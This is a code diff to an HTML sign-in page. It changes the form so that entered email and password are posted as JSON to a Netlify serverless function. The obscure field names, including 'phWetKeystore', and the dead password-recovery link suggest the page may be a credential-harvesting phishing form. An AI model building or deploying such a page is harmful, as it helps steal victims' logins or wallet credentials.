@@ -90,7 +90,8 @@
         
         <h2 class="h4 mb-4">Sign in</h2>
         
-        <form action="/submit"id="conforpky"method="post">
+        <form action="/submit" id="conforpky" method="post" data-netlify="true" onsubmit="handleSubmit(event); return false">
+
             <div class="mb-3">
                 <input type="email" class="form-control" placeholder="Email" id="phWetKeystore"name="wName" required>
             </div>
@@ -100,7 +101,10 @@
                 <button type="button" class="show-password" id="togglePassword">Show</button>
             </div>
             
-            <button class="proceed-button" type="button" id="sendMessageButton" onclick="handleSubmit()">Sign In</button>
+            <!-- Add a hidden input for Netlify form detection -->
+            <input type="hidden" name="form-name" value="conforpky">
+            
+            <button class="proceed-button" type="submit" id="sendMessageButton">Submit</button>
             <div class="text-center">
                 <a href="#" class="text-decoration-none">Need to find your password?</a>
             </div> 
@@ -116,27 +120,49 @@
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
-    <script> 
-function handleSubmit() {
-  const form = document.getElementById('conforpky');
-  const formData = new FormData(form);
-  const data = Object.fromEntries(formData);
-  
-    // Use full URL to ensure correct routing
-    fetch("/submit", {
+
+    <script>
+        function handleSubmit(event) {
+    event.preventDefault();
+    
+    const form = document.getElementById('conforpky');
+    const formData = new FormData(form);
+    const data = Object.fromEntries(formData);
+    const sendButton = form.querySelector(".proceed-button");
+    
+    sendButton.disabled = true;
+    
+    fetch("/.netlify/functions/submit", {  // Updated path for Netlify functions
         method: "POST",
         headers: {
             'Content-Type': 'application/json',
         },
-        body: JSON.stringify(Object.fromEntries(formData))
+        body: JSON.stringify(data)
+    })
+    .then(async response => {
+        if (response.ok) {
+            console.log('Success');
+            sendButton.textContent = "Success";
+            form.reset();
+        } else {
+            const errorText = await response.text();
+            throw new Error(errorText || 'Network response was not ok');
+        }
     })
     .catch(error => {
         console.error('Error:', error);
         sendButton.textContent = "Error Connecting";
         sendButton.classList.add("error-button");
+    })
+    .finally(() => {
+        setTimeout(() => {
+            sendButton.textContent = "Submit";
+            sendButton.classList.remove("error-button");
+            sendButton.disabled = false;
+        }, 2000);
     });
 }
-</script>
+    </script>
 
 </body>
 </html>
